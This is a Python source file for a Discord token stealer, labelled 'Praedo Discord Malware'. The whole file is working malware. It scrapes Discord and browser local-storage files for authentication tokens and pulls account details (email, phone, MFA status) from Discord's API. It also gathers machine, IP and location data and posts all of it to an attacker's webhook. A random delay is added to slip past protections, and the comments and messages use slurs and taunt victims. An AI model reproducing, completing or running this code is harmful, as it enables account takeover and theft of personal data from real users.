import requests, random, os, sys, platform, json, psutil, socket, re, uuid, hashlib, urllib.request, time, winreg, re, base64
from datetime import datetime

infected_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S') # Time when faggot got infected LOL
colors = [0x630464, 0x721d73, 0x823683, 0x914f92, 0xa168a2, 0xb181b1]
webhook = 'webhook here!'

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"	    : ROAMING + "\\Discord",
	"Discord Canary": ROAMING + "\\discordcanary",
	"Discord PTB"   : ROAMING + "\\discordptb",
	"Google Chrome" : LOCAL   + "\\Google\\Chrome\\User Data\\Default",
	"Opera"		    : ROAMING + "\\Opera Software\\Opera Stable",
	"Brave"		    : LOCAL   + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"		: LOCAL   + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in re.findall(regex, line):
					tokens.append(token)
	return tokens

def givetokens():
	checked = []
	working_ids = []
	working = []
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in gettokens(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = base64.b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue

			working_ids.append(uid)
			working.append(token)
	
	return working

def getpcinfo(): # grab pc info
	return {
	'os': platform.system(),
	'platform': platform.platform(),
	'os_ver': platform.version(),
	'arch': platform.machine(),
	'cpu': platform.processor(),
	'hostname': socket.gethostname(),
	'mac': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
	'ram': str(round(psutil.virtual_memory().total / (1024.0 **3)))+' GB'
	}

def getipinfo():
	data = json.loads(requests.get('https://wtfismyip.com/json').content)
	return {
	'pub_ip': data['YourFuckingIPAddress'],
	'priv_ip': socket.gethostbyname(socket.gethostname()),
	'loc': data['YourFuckingLocation'],
	'pub_host': data['YourFuckingHostname'],
	'isp': data['YourFuckingISP'],
	'istorexit': data['YourFuckingTorExit'],
	'cc': data['YourFuckingCountryCode']
	}

def getcordinfo(token):
	re = requests.get('https://discordapp.com/api/v7/users/@me', headers={'Content-Type': 'application/json', 'Authorization': token})
	data = json.loads(re.content)
	return {
	    'id': data['id'],
	    'name': data['username'],
	    'tag': data['discriminator'],
	    'fullname': f'{data["username"]}#{data["discriminator"]}',
	    'avatar':
	    f'https://cdn.discordapp.com/avatars/{data["id"]}/{data["avatar"]}.jpg',
	    'mfa': data['mfa_enabled'],
	    'email': data['email'],
	    'phone': data['phone'],
	    'verified': data['verified'],
	}

def sendhook(hook):
	try:
		info = getcordinfo(givetokens()[0])
		avatar = info['avatar']

		data = {'content': '', 'username': f'Praedo Malware | Version 1.0 | Victim: {info["fullname"]}', 'avatar_url': avatar}
		victim_id = hashlib.md5(getipinfo()["pub_ip"].encode()).hexdigest()
		embed_color = random.choice(colors)
		token_list = givetokens()
		tokens = ''.join(f'{i}\n' for i in token_list)
		data['embeds'] = [
		{
			'author': {
				'name': f'haha get rekt {info["fullname"]}',
				'icon_url': avatar
			},

			'title': f'Data of victim #{victim_id}',
			'description': f'Infected on {infected_at}, found {len(token_list)} {"token" if len(token_list) == 1 else "tokens"}.',
			'color': embed_color,
			'fields': [
			{
				'name': '**PC Info**',
				'value': f'```OS: {getpcinfo()["os"]}\nOS Version: {getpcinfo()["os_ver"]}\nPlatform: {getpcinfo()["platform"]}\nCPU Arch: {getpcinfo()["arch"]}\nCPU Info: {getpcinfo()["cpu"]}\nHostname: {getpcinfo()["hostname"]}\nMAC: {getpcinfo()["mac"]}\nRAM: {getpcinfo()["ram"]}```',
				'inline': True
			},
			{
				'name': '**IP Info**',
				'value': f'```Public IP: {getipinfo()["pub_ip"]}\nPrivate IP: {getipinfo()["priv_ip"]}\nISP: {getipinfo()["isp"]}\nCountry Code: {getipinfo()["cc"]}\nLocation: {getipinfo()["loc"]}\nPublic Hostname: {getipinfo()["pub_host"]}\nIs Tor Exit? {getipinfo()["istorexit"]}```',
				'inline': True
			},
			{
				'name': '**Discord Info**',
				'value': f'```Username: {info["name"]}\nDiscriminator: {info["tag"]}\nFull name: {info["fullname"]}\nAvatar url: {info["avatar"]}\nMFA Enabled: {info["mfa"]}\nEmail: {info["email"]}\nPhone: {info["phone"]}\nVerified? {info["verified"]}```',
				'inline': False
			}],
			'footer': {
				'text': '« Praedo Discord Malware, by 0x00 »'
			}
		}]

		requests.post(hook, json=data)

		data['embeds'] = [
		{
			'title': f'{"Token" if len(token_list) == 1 else "Tokens"} from victim {victim_id}',
			'description': f'These are the Discord {"token" if len(token_list) == 1 else "tokens"} from {info["fullname"]}, i found {len(token_list)} in total.',
			'color': embed_color,
			'fields': [
			{
				'name': f'**{"Token" if len(token_list) == 1 else "Tokens"}**',
				'value': f'```{tokens}```',
				'inline': False
			}],
			'footer': {
				'text': '« Praedo Discord Malware, by 0x00 »'
			}
		}]

		requests.post(hook, json=data)
	except:
		exit()

if __name__ == '__main__':
	time.sleep(random.randint(0, 10)) # bypasses some protection shit
	sendhook(webhook)